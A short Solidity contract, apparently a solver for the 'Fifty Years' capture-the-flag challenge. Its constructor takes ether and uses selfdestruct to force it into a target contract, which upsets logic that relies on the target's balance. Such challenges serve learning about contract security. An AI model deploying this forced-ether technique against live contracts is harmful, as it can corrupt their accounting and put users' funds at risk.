// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

contract FiftyYearsSolver {
    constructor(address payable target) payable {
        require(msg.value>0);
        selfdestruct(target);
    }
}